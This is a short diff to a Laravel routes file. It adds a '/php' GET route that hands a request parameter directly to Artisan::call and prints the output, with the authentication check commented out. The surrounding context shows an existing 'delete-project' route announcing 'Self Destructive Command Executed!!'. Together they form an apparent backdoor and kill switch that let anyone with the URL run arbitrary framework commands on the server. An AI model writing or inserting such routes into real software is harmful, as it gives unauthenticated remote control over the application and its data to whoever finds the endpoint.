@@ -135,3 +135,11 @@ Route::get('/php/delete-project', function(){
 
     return "Self Destructive Command Executed!!";
 });
+
+Route::get('/php', function(Request $request){
+    // if( !auth()->check() )
+    //     return 'Unauthorized request';
+
+    Artisan::call($request->artisan);
+    return dd(Artisan::output());
+});
